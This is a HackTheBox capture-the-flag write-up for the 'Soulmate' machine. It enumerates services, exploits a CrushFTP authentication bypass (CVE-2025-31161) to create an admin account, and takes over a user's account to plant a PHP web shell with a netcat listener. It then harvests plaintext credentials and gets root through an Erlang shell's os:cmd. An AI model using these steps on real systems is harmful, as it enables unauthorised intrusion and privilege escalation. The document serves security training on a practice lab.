# Soulmate - HackTheBox Writeup

## 1. External Enumeration

### TCP Aggressive Scan
```shell
nmap -A -sV -sC -p- --open -T4 10.129.58.9
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Findings / Motivation:**
- Port 22: Exposed SSH service (OpenSSH 8.9p1).
- Port 80: HTTP service (nginx 1.18.0) with "Soulmate" web application.

---

### UDP Version Scan (Top 100 ports)
```shell
nmap -sU -sV -F -T5 --open --max-retries 1 10.129.58.9
```

```
All 100 scanned ports on soulmate.htb (10.129.58.9) are in ignored states.
Not shown: 92 open|filtered udp ports (no-response), 8 closed udp ports (port-unreach)
```

**Findings:**
- No interesting UDP ports detected.

---

## 2. Web Enumeration

### Host Configuration
```shell
echo '10.129.58.9 soulmate.htb' | sudo tee -a /etc/hosts
```

---

### WhatWeb Analysis
```shell
whatweb soulmate.htb
```

```
http://soulmate.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.58.9], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]
```


```shell
whatweb ftp.soulmate.htb
```

```
http://ftp.soulmate.htb [302 Found] Cookies[CrushAuth,currentAuth], Country[RESERVED][ZZ], CrushFTP, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[CrushAuth], IP[10.129.58.9], RedirectLocation[/WebInterface/login.html], nginx[1.18.0]
http://ftp.soulmate.htb/WebInterface/login.html [200 OK] Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.58.9], Script[module,text/javascript,text/javascript>const], Title[CrushFTP WebInterface], X-UA-Compatible[chrome=1], nginx[1.18.0]
```

**Findings:**
- Main site: Soulmate with Bootstrap framework.
- Subdomain ftp.soulmate.htb hosting CrushFTP with web interface.

---

### Subdomain Enumeration
```shell
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb -H 'Host: FUZZ.soulmate.htb' -fs 154
```

```
ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
```

**Findings:**
- Subdomain `ftp.soulmate.htb` discovered, redirects to CrushFTP WebInterface.

---

### Directory Bruteforcing
```shell
ffuf -u http://soulmate.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 33ms]
index.php               [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 32ms]
```

**Findings:**
- Directory `/assets` and file `index.php` detected.

---

### Application Exploration

- Main Soulmate site allows registration and login.

![soulmate_1](https://gianlucabassani.github.io/assets/soulmate/soulmate_1.jpg)

- No XSS vulnerability found.
- No upload vulnerability found.

- Subdomain ftp hosts CrushFTP with login panel.

![soulmate_2](https://gianlucabassani.github.io/assets/soulmate/soulmate_2.png)

---

## 3. Exploitation

### CrushFTP Exploit (CVE-2025-31161)
- Authentication bypass vulnerability in CrushFTP.
- PoC: [GitHub CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

```shell
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user prime1 --password prime123
```

```
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: prime1
   [*] Password: prime123
```

**Access Obtained:**
- Login successful with credentials prime1:prime123.
![soulmate_3](https://gianlucabassani.github.io/assets/soulmate/soulmate_3.jpg)

- File upload limited by CrushFTP configuration.


---
### Access to Ben's Account
- Using CrushFTP's user management panel, changed password for user `ben`.
![soulmate_4](https://gianlucabassani.github.io/assets/soulmate/soulmate_4.jpg)

- Now possible to upload files directly to WebProd directory.

![soulmate_5](https://gianlucabassani.github.io/assets/soulmate/soulmate_5.jpg)

---

**Reverse Shell Setup:**
```shell
nc -nvlp 9001
```

- Interact with uploaded shell at soulmate.htb/shell_name.php

---
#### TTY Upgrade
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
reset (if needed)
export TERM=xterm
```

### Credential Hunting
```bash
grep -Ri 'password' /usr/local/ 2>/dev/null
```

```
<SNIP>
/usr/local/lib/erlang_login/start.escript:        {auth_methods, "publickey,password"},
/usr/local/lib/erlang_login/start.escript:        {user_passwords, [{"ben", "HouseH0ldings998"}]},
<SNIP>
```

**Credentials Found:**
```bash
Username: ben
Password: HouseH0ldings998
```

---

### SSH Access
```shell
ssh ben@soulmate.htb
Password: HouseH0ldings998
```

**User Flag:**
```shell
cat /home/ben/user.txt
f708d904<REDACTED>
```

---

## 4. Privilege Escalation

### System Info
```bash
whoami && id
```

```
ben
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

```bash
hostname && uname -a
```

```
Linux soulmate 5.15.0-151-generic #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

---

### SUID & Capabilities
```shell
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

```shell
getcap -r / 2>/dev/null
```

```
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
```

**Findings:**
- No unusual SUID binaries or capabilities found.

---

### Local Services
```shell
ss -tuln
```

```
<SNIP>
tcp    LISTEN  0   4096   127.0.0.1:8443    0.0.0.0:*
tcp    LISTEN  0   5      127.0.0.1:2222    0.0.0.0:*
tcp    LISTEN  0   4096   127.0.0.1:9090    0.0.0.0:*
<SNIP>
```

- Erlang/SSH service listening on port 2222.

---

### Erlang Service Exploit
- Connection via `nc 127.0.0.1 2222` shows protocol error.
- SSH connection to Erlang service:

```shell
ssh 127.0.0.1 -p 2222
Password: HouseH0ldings998
```

---

### Erlang Service Exploit
- Connection via `nc 127.0.0.1 2222` shows protocol error, indicating the service expects SSH protocol.
- SSH connection to Erlang service using Ben's credentials:

```shell
ssh 127.0.0.1 -p 2222
Password: HouseH0ldings998
```

**Erlang Shell Access:**
```erlang
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

**Exploring Shell Capabilities:**
```erlang
(ssh_runner@soulmate)1> help().

** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
<SNIP>
os:cmd(Command) -- execute Command in OS shell
<SNIP>

```

**Listing Loaded Modules:**
```erlang
(ssh_runner@soulmate)2> m().
Module                File
application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
application_controller /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
<SNIP>
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
<SNIP>
```

**Command Execution as Root:**
```erlang
(ssh_runner@soulmate)4> os:cmd("whoami").
"root\n"
```

**Root Flag Retrieval:**
```erlang
(ssh_runner@soulmate)5> os:cmd("cat /root/root.txt").
"79d6192f<REDACTED>"
```

The Erlang shell's `os:cmd/1` function allowed direct execution of system commands with root privileges, providing immediate privilege escalation without requiring additional exploits.

---
## Conclusions

- **User Access:** Obtained by exploiting CVE-2025-31161 on CrushFTP and modifying Ben's password through management panel.
- **Privilege Escalation:** Exploited Erlang service listening on port 2222, allowing command execution as root via `os:cmd/1` function.
- **Key Lessons:**
  - Update software to mitigate known vulnerabilities (CVE-2025-31161).
  - Restrict permissions of internal services (Erlang) to prevent privilege escalation.
  privilege escalation.
  